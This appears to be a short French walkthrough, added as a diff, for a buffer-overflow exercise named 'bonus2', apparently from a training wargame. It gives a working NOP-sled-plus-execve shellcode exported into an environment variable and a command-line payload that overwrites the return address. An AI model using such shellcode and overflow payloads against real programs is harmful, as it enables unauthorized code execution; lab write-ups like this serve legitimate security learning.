@@ -1,0 +1,17 @@
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789
+
+avec notre pattern et  en utilisant lang=fi on a un segfault sur le 18 eme charactere
+
+on va donc tt simplement fr un shellcode en env et l injecter a l offset en suivant les characteristique de notre pattern
+
+on inhecte notre shell code
+
+export SHELLCODE=$(python -c 'print "\x90"*100 + "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"')
+
+on recupere son adresse avec le getenv charactere
+
+et on ft le payload
+
+./bonus2 $(python -c "print 'W'*40 + ' ' + 'J'*18 + '\xb8\xf8\xff\xbf'")
+
+
